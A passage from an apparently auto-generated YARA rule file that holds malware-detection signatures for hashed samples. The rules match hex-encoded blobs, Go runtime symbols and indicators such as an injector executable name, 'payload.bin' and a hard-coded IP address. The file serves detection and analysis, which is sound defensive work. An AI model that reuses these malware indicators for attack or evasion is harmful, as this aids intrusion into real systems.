      hash1 = "13c557ea66a10b9198bb66451ea9b7428f284265b3c6c51c28612bea3c7a04f4"
   strings:
      $s1 = "4141414141414141414141" ascii /* reversed goodware string '1414141414141414141414' */ /* score: '27.00'*/ /* hex encoded string 'AAAAAAAAAAA' */
      $s2 = "41414141414141" ascii /* reversed goodware string '14141414141414' */ /* score: '27.00'*/ /* hex encoded string 'AAAAAAA' */
      $s3 = "41414141414141414141" ascii /* reversed goodware string '14141414141414141414' */ /* score: '27.00'*/ /* hex encoded string 'AAAAAAAAAA' */
      $s4 = "76534248756b4c6675455339494564414b434658756b4c6675455339494564584b434658756b4c66754553394945656351742b34524c306752377043" ascii /* score: '24.00'*/ /* hex encoded string 'vSBHukLfuES9IEdAKCFXukLfuES9IEdXKCFXukLfuES9IEecQt+4RL0gR7pC' */
      $s5 = "64694a6b45564554764d2f677847515a56534d36754c627a524a4d3064616650364e444d766e7a765873396e345978506a74764d6e6e7a7251586447497a7249" ascii /* score: '24.00'*/ /* hex encoded string 'diJkEVETvM/gxGQZVSM6uLbzRJM0dafP6NDMvnzvXs9n4YxPjtvMnnzrQXdGIzrINvh0nZ76dJy+/8wRXa3zdzgVSbC8' */
      $s6 = "71424f567755737632495977644657374e744c4373724b6c614c354333306a797a64464938757a52624c624a4e5853574f4e5a4932332b7445315a4371375842" ascii /* score: '24.00'*/ /* hex encoded string 'qBOVwUsv2IYwdFW7NtLCsrKlaL5C30jyzdFI8uzRbLbJNXSWONZI23+tE1ZCq7XBSy/CSkffuEsLULVLC3G1b09UVndvpbFL' */
      $s7 = "6e613042514f3274773241644945644537636857654c776778494356705963786f364f4259447a652f36612f4d4476764e71786a324c30675278714f" ascii /* score: '24.00'*/ /* hex encoded string 'na0BQO2tw2AdIEdE7chWeLwgxICVpYcxo6OBYDze/6a/MDvvNqxj2L0gRxqO' */
      $s8 = "6948487369346878374975496365794c694846317a4b672b7a4538533671734353445a6f4538337733456a79364454436c736b757a4147787177704d6c6d682f" ascii /* score: '24.00'*/ /* hex encoded string 'iHHsi4hx7IuIceyLiHF1zKg+zE8S6qsCSDZoE83w3Ejy6DTClskuzAGxqwpMlmh/zfAorHo2bbvPyDDMObXT48' */
      $s9 = "4241415567415141464941454147317a646d4e796443356b62477741414141414141414141414141414141414141414141414141414141414141414141414141" ascii /* score: '24.00'*/ /* hex encoded string 'BAAUgAQAFIAEAG1zdmNydC5kbGwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' */
      $s10 = "6a4961353631516158562b73303050626e38616266496d305747457153546765714c79583363635675676969324537533773504775475731372f757257386853" ascii /* score: '24.00'*/ /* hex encoded string 'jIa561QaXV+s00Pbn8abfIm0WGEqSTgeqLyX3ccVugii2E7S7sPGuGW17/urW8hS/mS7oA5zFiiuaSnYbWtc93USkuNujA' */
      $s11 = "38744e742b34683963687277374333376764667175344554624d784b694e6333536653325658784f74337a4c51306661664d344e364141573073523053397152" ascii /* score: '24.00'*/ /* hex encoded string '8tNt+4h9chrw7C37gdfqu4ETbMxKiNc3SfS2VXxOt3zLQ0fafM4N6AAW0sR0S9qRqQySnOGWXmAruty02D+PhG' */
      $s12 = "643061726e6f56324a6e532f766c33767a324d546e32646b717771676a7635456d7a4330564134582b416c46364e444f45554772766f56794e737956" ascii /* score: '24.00'*/ /* hex encoded string 'd0arnoV2JnS/vl3vz2MTn2dkqwqgjv5EmzC0VA4X+AlF6NDOEUGrvoVyNsyV' */
      $s13 = "34784c5055614f6a7644374d56386d35424339457453424846465867734c7443337a4a4d4d47526a534f3349524c78433337677873613044594b6c7772374a4b" ascii /* score: '24.00'*/ /* hex encoded string '4xLPUaOjvD7MV8m5BC9EtSBHFFXgsLtC3zJMMGRjSO3IRLxC37gxsa0DYKlwr7JK37i7yDDKAJk8F6xU17i7PuRnx8A0RzCd' */
      $s14 = "42556445516942306c445a742b3456554b456a79664b744c776332795256513877556537765342306c624b57416f77324c4d49304c794a5878567a6652305339" ascii /* score: '24.00'*/ /* hex encoded string 'BUdEQiB0lDZt+4VUKEjyfKtLwc2yRVQ8wUe7vSB0lbKWAow2LMI0LyJXxVzfR0S9' */
      $s15 = "795375345559324f52465255444c69375174395364424d6a567831364a6b5a457653437562454c66754336383333533771484470523631354873463956553644" ascii /* score: '24.00'*/ /* hex encoded string 'ySu4UY2ORFRUDLi7Qt9SdBMjVx16JkZEvSCubELfuC6833S7qHDpR615HsF9VU6D+NxVRL0grGk2Zb8T6ne4dNchLUZCEy1F1y' */
      $s16 = "4945664d4e62686452363167724b4a4346643966766a4334556431535256513434444a58484c6863523630644e314f2b4d444e44376369754b454c6648733267" ascii /* score: '24.00'*/ /* hex encoded string 'IEfMNbhdR61grKJCFd9fvjC4Ud1SRVQ44DJXHLhcR60dN1O+MDND7ciuKELfHs2guFxHrXO4' */
      $s17 = "7857523732356961324f7a32772b385648394d57352b4465354151393441664c754b7249316f4b4e31646d636e4e70387a57682f7355776b73766a652f2f7679" ascii /* score: '24.00'*/ /* hex encoded string 'xWR725ia2Oz2w+8VH9MW5+De5AQ94AfLuKrI1oKN1dmcnNp8zWh/sUwksvje//vyyuHxnhJVnW' */
      $s18 = "3367416c506331424e44656444514971336b386a49646c6a4b436e5151536b676e514a694e3538674243764954434e6b3030387a5a4e5a4a4b79696442534e2b" ascii /* score: '24.00'*/ /* hex encoded string '3gAlPc1BNDedDQIq3k8jIdljKCnQQSkgnQJiN58gBCvITCNk008zZNZJKyidBSN+' */
      $s19 = "58514f2b7a2f44595449752b3638344a5a61734b7244625a686f756b7135364664697430767a6235686f2b37453778484142533475304b726e33646a41353533" ascii /* score: '24.00'*/ /* hex encoded string 'XQO+z/DYTIu+684JZasKrDbZhoukq56Fdit0vzb5ho+7E7xHABS4u0Krn3djA553YyOYySkzFRWDuEYRWasamDR1u8/o' */
      $s20 = "51686374446c5354523053393335484852534e4977527767523051324e3879474d4768477a71566777352f493257794642694247524c30626845732b70456445" ascii /* score: '24.00'*/ /* hex encoded string 'QhctDlSTR0S935HHRSNIwRwgR0Q2N8yGMGhGzqVgw5/I2WyFBiBGRL0bhEs+pEdEvUgbkb8wFawCMUZENtAeHTjWMy/urQNgqU' */
   condition:
      uint16(0) == 0x0a0d and filesize < 3000KB and
      8 of them
}

rule sig_669fcafcaf217a0ae7776d1c98b6cbb4fd75fb97b12965185136a09c7bfc0ef2 {
   meta:
      description = "dataset - file 669fcafcaf217a0ae7776d1c98b6cbb4fd75fb97b12965185136a09c7bfc0ef2"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "669fcafcaf217a0ae7776d1c98b6cbb4fd75fb97b12965185136a09c7bfc0ef2"
   strings:
      $s1 = "$SRcWZ\\" fullword ascii /* score: '4.00'*/
      $s2 = "$SRlWJ\\" fullword ascii /* score: '4.00'*/
      $s3 = "eWQuK,mb" fullword ascii /* score: '4.00'*/
      $s4 = "YaWTvEW" fullword ascii /* score: '4.00'*/
      $s5 = "SWlWj\\" fullword ascii /* score: '4.00'*/
      $s6 = "uKRmb,_" fullword ascii /* score: '4.00'*/
      $s7 = "BsDM=jvf$" fullword ascii /* score: '4.00'*/
      $s8 = "&SRcWH\\" fullword ascii /* score: '4.00'*/
      $s9 = "\"SRcW\\\\" fullword ascii /* score: '4.00'*/
      $s10 = "0= />6-&,+:=\" 74xI|CvBqJd_fQjTkX@eHgNnEn\\sRuRx_|" fullword ascii /* score: '4.00'*/
      $s11 = "gv/SRlWH\\" fullword ascii /* score: '4.00'*/
      $s12 = "&SRlWH\\" fullword ascii /* score: '4.00'*/
      $s13 = "SVcWE\\" fullword ascii /* score: '4.00'*/
      $s14 = "^%Wauw8mb" fullword ascii /* score: '4.00'*/
      $s15 = "ywLA9cd}-" fullword ascii /* score: '4.00'*/
      $s16 = "WSvrWQj" fullword ascii /* score: '4.00'*/
      $s17 = "ZbQY&/t" fullword ascii /* score: '4.00'*/
      $s18 = "SVcWC\\" fullword ascii /* score: '4.00'*/
      $s19 = "%SRlWK\\" fullword ascii /* score: '4.00'*/
      $s20 = "SVcW]\\" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule a5f55361eff96ff070818640d417d2c822f9ae1cdd7e8fa0db943f37f6494db9 {
   meta:
      description = "dataset - file a5f55361eff96ff070818640d417d2c822f9ae1cdd7e8fa0db943f37f6494db9"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "a5f55361eff96ff070818640d417d2c822f9ae1cdd7e8fa0db943f37f6494db9"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s2 = "word/_rels/document.xml.relsUT" fullword ascii /* score: '7.00'*/
      $s3 = "}wCIW.lpk~v" fullword ascii /* score: '7.00'*/
      $s4 = "lknmye" fullword ascii /* score: '5.00'*/
      $s5 = "word/media/UT" fullword ascii /* score: '4.00'*/
      $s6 = "_rels/UT" fullword ascii /* score: '4.00'*/
      $s7 = "docProps/app.xmlUT" fullword ascii /* score: '4.00'*/
      $s8 = "word/media/image1.jpegUT" fullword ascii /* score: '4.00'*/
      $s9 = "word/webSettings.xmlUT" fullword ascii /* score: '4.00'*/
      $s10 = "LAIIGIIAwK" fullword ascii /* score: '4.00'*/
      $s11 = "docProps/core.xmlUT" fullword ascii /* score: '4.00'*/
      $s12 = "word/settings.xmlUT" fullword ascii /* score: '4.00'*/
      $s13 = "word/fontTable.xmlUT" fullword ascii /* score: '4.00'*/
      $s14 = "OfvO}6At" fullword ascii /* score: '4.00'*/
      $s15 = "word/theme/theme1.xmlUT" fullword ascii /* score: '4.00'*/
      $s16 = "word/styles.xmlUT" fullword ascii /* score: '4.00'*/
      $s17 = "_rels/.relsUT" fullword ascii /* score: '4.00'*/
      $s18 = "docProps/UT" fullword ascii /* score: '4.00'*/
      $s19 = "word/media/image2.wmfUT" fullword ascii /* score: '4.00'*/
      $s20 = "word/document.xmlUT" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 70KB and
      8 of them
}

rule sig_44f0647c3a00cb5745cf341a5645355249a944952d26f9737beebc78a7b40ba4 {
   meta:
      description = "dataset - file 44f0647c3a00cb5745cf341a5645355249a944952d26f9737beebc78a7b40ba4"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "44f0647c3a00cb5745cf341a5645355249a944952d26f9737beebc78a7b40ba4"
   strings:
      $x1 = "HanzoInjection.exe" fullword ascii /* score: '32.00'*/
      $s2 = "payload.bin" fullword ascii /* score: '22.00'*/
      $s3 = "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MALC)" fullword ascii /* score: '20.00'*/
      $s4 = "1.bat=" fullword ascii /* score: '8.00'*/
      $s5 = "106.52.38.217" fullword ascii /* score: '6.00'*/
      $s6 = "WWWWWh:Vy" fullword ascii /* score: '4.00'*/
      $s7 = "hwiniThLw&" fullword ascii /* score: '4.00'*/
      $s8 = "RRRSRPh" fullword ascii /* score: '4.00'*/
      $s9 = "cvFfL9" fullword ascii /* score: '2.00'*/
      $s10 = "Yb'6Iu" fullword ascii /* score: '1.00'*/
      $s11 = ";;gR-;" fullword ascii /* score: '1.00'*/
      $s12 = "[.CRGS14" fullword ascii /* score: '1.00'*/
      $s13 = ":wJ!Y{" fullword ascii /* score: '1.00'*/
      $s14 = "en@x7$K" fullword ascii /* score: '1.00'*/
      $s15 = "ef3z6/" fullword ascii /* score: '1.00'*/
      $s16 = "[i<\"2<N" fullword ascii /* score: '1.00'*/
      $s17 = "BiW@wh" fullword ascii /* score: '1.00'*/
      $s18 = "b[1uNy" fullword ascii /* score: '1.00'*/
      $s19 = "T/vd?6]" fullword ascii /* score: '1.00'*/
      $s20 = "Edl`eh@\\" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule sig_7681e4fc876248e697155c21dc2e57efe91240ed6e2204d011b4cf19e944f555 {
   meta:
      description = "dataset - file 7681e4fc876248e697155c21dc2e57efe91240ed6e2204d011b4cf19e944f555"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7681e4fc876248e697155c21dc2e57efe91240ed6e2204d011b4cf19e944f555"
   strings:
      $s1 = "pc)J:\\" fullword ascii /* score: '7.00'*/
      $s2 = "z+ o{M\"" fullword ascii /* score: '5.00'*/
      $s3 = "niih?$" fullword ascii /* score: '4.00'*/
      $s4 = "8vVWQ=!YZ0(KG'3EL*:o}" fullword ascii /* score: '4.00'*/
      $s5 = "SKwc)J;" fullword ascii /* score: '4.00'*/
      $s6 = "Zsrc)xrc)z" fullword ascii /* score: '4.00'*/
      $s7 = "cihc)~S" fullword ascii /* score: '4.00'*/
      $s8 = "u(.fuH)" fullword ascii /* score: '4.00'*/
      $s9 = "SYhc)vM" fullword ascii /* score: '4.00'*/
      $s10 = ".uuI)]rZ(" fullword ascii /* score: '4.00'*/
      $s11 = "rilD&*aQW" fullword ascii /* score: '4.00'*/
      $s12 = "UKrtn>rc" fullword ascii /* score: '4.00'*/
      $s13 = "SIbc)J;" fullword ascii /* score: '4.00'*/
      $s14 = "_AUqRH[zESIgHZGlkem]flcVqwqK|~" fullword ascii /* score: '4.00'*/
      $s15 = "sc)vM%z;" fullword ascii /* score: '3.50'*/
      $s16 = "\\[8a7}" fullword ascii /* score: '2.00'*/
      $s17 = "\\[8U7}" fullword ascii /* score: '2.00'*/
      $s18 = "\\[8Q7}" fullword ascii /* score: '2.00'*/
      $s19 = "l>7Ac)" fullword ascii /* score: '1.00'*/
      $s20 = "lCP#LRQ" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule abce33edfa88dfe933813aa249d9faaa0ee890100111d42a1bc9a01719821051 {
   meta:
      description = "dataset - file abce33edfa88dfe933813aa249d9faaa0ee890100111d42a1bc9a01719821051"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "abce33edfa88dfe933813aa249d9faaa0ee890100111d42a1bc9a01719821051"
   strings:
      $s1 = "yxPHJ{@r" fullword ascii /* score: '4.00'*/
      $s2 = "oIkC4sc4" fullword ascii /* score: '4.00'*/
      $s3 = "vxPqo;|" fullword ascii /* score: '4.00'*/
      $s4 = "ujQxP{?" fullword ascii /* score: '4.00'*/
      $s5 = "tKkYzKk" fullword ascii /* score: '4.00'*/
      $s6 = "op~bf~uo}lhxtbcuKHRVBFY[YTDLPZOA'" fullword ascii /* score: '4.00'*/
      $s7 = ".Jkc/Jk" fullword ascii /* score: '4.00'*/
      $s8 = "PJiI'OHE" fullword ascii /* score: '4.00'*/
      $s9 = "xCKk$CKk" fullword ascii /* score: '4.00'*/
      $s10 = "vss  v" fullword ascii /* score: '3.00'*/
      $s11 = "axz@4NL@" fullword ascii /* score: '1.00'*/
      $s12 = "x?Kk$?Kk" fullword ascii /* score: '1.00'*/
      $s13 = "uOu{x@" fullword ascii /* score: '1.00'*/
      $s14 = "_h{>_`{>_p" fullword ascii /* score: '1.00'*/
      $s15 = "J{(RZ{@" fullword ascii /* score: '1.00'*/
      $s16 = "[Oqzz@" fullword ascii /* score: '1.00'*/
      $s17 = "tbcu~n" fullword ascii /* score: '1.00'*/
      $s18 = "hYh\"q@" fullword ascii /* score: '1.00'*/
      $s19 = ";yPMJz@" fullword ascii /* score: '1.00'*/
      $s20 = "[{1?kx" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule sig_86b5758f451706f5bf624abf2ead891183e828ef188188182ca528c7f1dedd35 {
   meta:
      description = "dataset - file 86b5758f451706f5bf624abf2ead891183e828ef188188182ca528c7f1dedd35"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "86b5758f451706f5bf624abf2ead891183e828ef188188182ca528c7f1dedd35"
   strings:
      $s1 = "xB)c1+ " fullword ascii /* score: '5.00'*/
      $s2 = "s@* Bc" fullword ascii /* score: '5.00'*/
      $s3 = "xB)c-* " fullword ascii /* score: '5.00'*/
      $s4 = "o<0c-+ " fullword ascii /* score: '5.00'*/
      $s5 = "ghlv5|; " fullword ascii /* score: '4.00'*/
      $s6 = "elvtioQ" fullword ascii /* score: '4.00'*/
      $s7 = "ypgb?0L:k$" fullword ascii /* score: '4.00'*/
      $s8 = "O$tLnqt,7}H)" fullword ascii /* score: '4.00'*/
      $s9 = "Opiwcq? " fullword ascii /* score: '4.00'*/
      $s10 = "8#KEy$" fullword ascii /* score: '4.00'*/
      $s11 = "*osctx!" fullword ascii /* score: '4.00'*/
      $s12 = "es+hwtLU!" fullword ascii /* score: '4.00'*/
      $s13 = "hvcmi " fullword ascii /* score: '3.00'*/
      $s14 = "piwtI7" fullword ascii /* score: '2.00'*/
      $s15 = ".1qL<#" fullword ascii /* score: '1.00'*/
      $s16 = "lpc$&!" fullword ascii /* score: '1.00'*/
      $s17 = "?~J4ZA" fullword ascii /* score: '1.00'*/
      $s18 = "V~/}H)" fullword ascii /* score: '1.00'*/
      $s19 = "lU tI7" fullword ascii /* score: '1.00'*/
      $s20 = "Fm.\\%r1b" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _ae1cbeb25f83ecb39372f83e9c0ca36364e1cd0207f07afb4cd240b4b1b96842_4b792c505b6dedad9f2a21c866212e96ae12c8415e3e9b249fa235e633_0 {
   meta:
      description = "dataset - from files ae1cbeb25f83ecb39372f83e9c0ca36364e1cd0207f07afb4cd240b4b1b96842, 4b792c505b6dedad9f2a21c866212e96ae12c8415e3e9b249fa235e63398c2c8, 21633bb2e378d40e3e13b88bf3a7fd397ad1229eab9730cf93fc2cc260fbdd4f, 7412c47f2db8f52182d8311dbc3539d2af5305c87f052a8d70eb6fd351723476, cff4bdbf0ed1b324aa9691af0c0819bf0140ade95384557f546acc01af3d8326, 712fb79d19d8e77a9f0b3f7d469a7277315838e242c821ee361ca70e1099d932"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "ae1cbeb25f83ecb39372f83e9c0ca36364e1cd0207f07afb4cd240b4b1b96842"
      hash2 = "4b792c505b6dedad9f2a21c866212e96ae12c8415e3e9b249fa235e63398c2c8"
      hash3 = "21633bb2e378d40e3e13b88bf3a7fd397ad1229eab9730cf93fc2cc260fbdd4f"
      hash4 = "7412c47f2db8f52182d8311dbc3539d2af5305c87f052a8d70eb6fd351723476"
      hash5 = "cff4bdbf0ed1b324aa9691af0c0819bf0140ade95384557f546acc01af3d8326"
      hash6 = "712fb79d19d8e77a9f0b3f7d469a7277315838e242c821ee361ca70e1099d932"
   strings:
      $s1 = "Invalid file name - %s The specified file was not found'\\'\\'%s\\'\\' is not a valid integer value" fullword wide /* score: '15.00'*/
      $s2 = "Abstract ErrorAAccess violation at address %p in module \\'%s\\'. %s of address %p" fullword wide /* score: '13.00'*/
      $s3 = "Application Error3Format \\'%s\\' invalid or incompatible with argument" fullword wide /* score: '12.00'*/
      $s4 = "No argument for format \\'%s\\'\"Variant method calls not supported" fullword wide /* score: '9.00'*/
      $s5 = "hr@#irC" fullword ascii /* score: '6.00'*/
      $s6 = "Mxlyfjc" fullword ascii /* score: '6.00'*/
      $s7 = "XGd+MDe SPY" fullword ascii /* score: '6.00'*/
      $s8 = "RDl#;V`/CMd$M" fullword ascii /* score: '6.00'*/
      $s9 = "\\YpIKY&Ich" fullword ascii /* score: '5.00'*/
      $s10 = "RXrF;X`" fullword ascii /* score: '4.00'*/
      $s11 = "tlHrDD/U" fullword ascii /* score: '4.00'*/
      $s12 = "XdCrC|\"M" fullword ascii /* score: '4.00'*/
      $s13 = "lnNnTnNn\\^N^Deo" fullword ascii /* score: '4.00'*/
      $s14 = "koMlS_M|[[M|Cz" fullword ascii /* score: '4.00'*/
      $s15 = "q,CgYpaL\"" fullword ascii /* score: '4.00'*/
      $s16 = "mhpFkhrF[h`Fc" fullword ascii /* score: '4.00'*/
      $s17 = "WTeFW%n.9vq" fullword ascii /* score: '4.00'*/
      $s18 = "sinKzBvMZ_" fullword ascii /* score: '4.00'*/
      $s19 = "xLgeF|?" fullword ascii /* score: '4.00'*/
      $s20 = "<$cYyD/y8" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad_487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae005120_1 {
   meta:
      description = "dataset - from files 8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad, 487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89, 83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc, 7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9, 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7, 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd, b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991, cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
      hash2 = "487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89"
      hash3 = "83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc"
      hash4 = "7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9"
      hash5 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash6 = "4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
      hash7 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      hash8 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      hash9 = "b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
      hash10 = "cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
   strings:
      $s1 = "runtime.getempty.func1" fullword ascii /* score: '22.00'*/
      $s2 = "runtime.getempty" fullword ascii /* score: '22.00'*/
      $s3 = "runtime.execute" fullword ascii /* score: '21.00'*/
      $s4 = "sync.runtime_SemacquireMutex" fullword ascii /* score: '21.00'*/
      $s5 = "runtime.gcDumpObject" fullword ascii /* score: '20.00'*/
      $s6 = "runtime.dumpregs" fullword ascii /* score: '20.00'*/
      $s7 = "runtime.dumpgstatus" fullword ascii /* score: '20.00'*/
      $s8 = "runtime.injectglist" fullword ascii /* score: '20.00'*/
      $s9 = "runtime.getlasterror" fullword ascii /* score: '18.00'*/
      $s10 = "runtime.(*rwmutex).rlock.func1" fullword ascii /* score: '18.00'*/
      $s11 = "runtime.(*rwmutex).runlock" fullword ascii /* score: '18.00'*/
      $s12 = "runtime.(*rwmutex).rlock" fullword ascii /* score: '18.00'*/
      $s13 = "*runtime.mutex" fullword ascii /* score: '18.00'*/
      $s14 = "runtime.putempty" fullword ascii /* score: '17.00'*/
      $s15 = "runqhead" fullword ascii /* score: '16.00'*/
      $s16 = "*syscall.DLL" fullword ascii /* score: '16.00'*/
      $s17 = "runtime.fastlog2" fullword ascii /* score: '15.00'*/
      $s18 = "runtime.bgsweep" fullword ascii /* score: '15.00'*/
      $s19 = "runtime.traceGCSweepSpan" fullword ascii /* score: '15.00'*/
      $s20 = "runtime.gcSweep" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad_487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae005120_2 {
   meta:
      description = "dataset - from files 8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad, 487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89, 83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc, 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7, 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd, b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991, cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
      hash2 = "487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89"
      hash3 = "83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc"
      hash4 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash5 = "4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
      hash6 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      hash7 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      hash8 = "b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
      hash9 = "cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
   strings:
      $s1 = "runtime.tracebackHexdump" fullword ascii /* score: '20.00'*/
      $s2 = "l32.dll" fullword ascii /* score: '20.00'*/
      $s3 = "i32.dll" fullword ascii /* score: '20.00'*/
      $s4 = "rof.dll" fullword ascii /* score: '20.00'*/
      $s5 = "os.Executable" fullword ascii /* score: '20.00'*/
      $s6 = "runtime.tracebackHexdump.func1" fullword ascii /* score: '20.00'*/
      $s7 = "runtime.hexdumpWords" fullword ascii /* score: '20.00'*/
      $s8 = "internal/testlog.Logger" fullword ascii /* score: '18.00'*/
      $s9 = "runtime.envKeyEqual" fullword ascii /* score: '18.00'*/
      $s10 = "runtime.startTemplateThread" fullword ascii /* score: '17.00'*/
      $s11 = "SystemFuH" fullword ascii /* base64 encoded string 'K+-zan' */ /* score: '17.00'*/
      $s12 = "_32.dll" fullword ascii /* score: '17.00'*/
      $s13 = "runtime.templateThread" fullword ascii /* score: '17.00'*/
      $s14 = "os.executable" fullword ascii /* score: '16.00'*/
      $s15 = "os.commandLineToArgv" fullword ascii /* score: '16.00'*/
      $s16 = "internal/poll.(*fdMutex).increfAndClose" fullword ascii /* score: '15.00'*/
      $s17 = "runtime.heapBits.forwardOrBoundary" fullword ascii /* score: '15.00'*/
      $s18 = "runtime.getArgInfoFast" fullword ascii /* score: '15.00'*/
      $s19 = "*poll.fdMutex" fullword ascii /* score: '15.00'*/
      $s20 = "ntdll.dlH" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330_ee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec9465_3 {
   meta:
      description = "dataset - from files ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330, ee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec946514088c"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330"
      hash2 = "ee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec946514088c"
   strings:
      $s1 = "HAAAAAAAA" fullword ascii /* base64 encoded string '      ' */ /* reversed goodware string 'AAAAAAAAH' */ /* score: '26.50'*/
      $s2 = "C:\\Users\\dev\\Desktop\\" fullword ascii /* score: '24.00'*/
      $s3 = "Dll6.dll" fullword ascii /* score: '20.00'*/
      $s4 = "\\Dll6\\x64\\Release\\Dll6.pdb" fullword ascii /* score: '19.00'*/
      $s5 = "Attempted to free unknown block %p at %s:%d" fullword ascii /* score: '16.50'*/
      $s6 = "Attempted to realloc unknown block %p at %s:%d" fullword ascii /* score: '16.50'*/
      $s7 = "Attempted to realloc %d-byte block %p at %s:%d previously freed/realloced at %s:%d" fullword ascii /* score: '16.50'*/
      $s8 = "Attempted to free %d-byte block %p at %s:%d previously freed/realloced at %s:%d" fullword ascii /* score: '16.50'*/
      $s9 = "invalid decoded scanline length" fullword ascii /* score: '16.00'*/
      $s10 = "stb.log" fullword ascii /* score: '16.00'*/
      $s11 = "Changed: %s - %08x:%08x" fullword ascii /* score: '15.00'*/
      $s12 = "s%s% :s%" fullword ascii /* reversed goodware string '%s: %s%s' */ /* score: '15.00'*/
